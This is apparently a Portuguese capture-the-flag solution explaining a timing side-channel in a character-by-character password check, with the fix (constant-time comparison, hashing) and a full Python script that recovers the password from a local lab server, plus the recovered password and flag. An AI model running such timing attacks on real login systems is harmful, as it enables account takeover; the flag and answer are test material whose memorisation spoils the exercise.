# Solução — 03 Login fraco

## O que está errado

`senha_confere_de_forma_insegura` compara a senha enviada com a correta caractere por caractere e **para no primeiro erro**. Cada caractere certo custa um `time.sleep` extra, então o tempo total de resposta cresce conforme você acerta mais caracteres do começo. Isso permite descobrir a senha posição por posição, sem nunca "adivinhar" ela inteira de uma vez — um **ataque de timing**.

A correção é usar `hmac.compare_digest(enviada, correta)`, que sempre compara em tempo constante, e, na prática, nunca guardar ou comparar senhas em texto puro — usar hash (`bcrypt`, `argon2`, etc.).

## Script de ataque

```python
import string
import time

import requests

URL = "http://127.0.0.1:5050/"
ALFABETO = string.ascii_lowercase + string.digits + "-"
TENTATIVAS_POR_CARACTERE = 5


def tempo_medio(senha_parcial):
    tempos = []
    for _ in range(TENTATIVAS_POR_CARACTERE):
        inicio = time.perf_counter()
        requests.post(URL, data={"usuario": "admin", "senha": senha_parcial})
        tempos.append(time.perf_counter() - inicio)
    tempos.sort()
    return tempos[len(tempos) // 2]  # mediana, mais resistente a ruído


def descobrir_senha(tamanho_maximo=32):
    senha = ""
    while len(senha) < tamanho_maximo:
        melhor_char, melhor_tempo = None, -1
        for char in ALFABETO:
            t = tempo_medio(senha + char)
            if t > melhor_tempo:
                melhor_char, melhor_tempo = char, t
        senha += melhor_char
        print("até agora:", senha)
        # para quando o próximo caractere não traz mais ganho de tempo
        if tempo_medio(senha) <= tempo_medio(senha[:-1]):
            return senha[:-1]
    return senha


if __name__ == "__main__":
    print("senha encontrada:", descobrir_senha())
```

Esse script recupera `tr0p1c0-s3gur0`. Fazendo login com `admin` / `tr0p1c0-s3gur0`, a página de sucesso mostra a flag.

## Flag

```
KHOADE{comparar_senha_char_a_char_vaza_tempo}
```
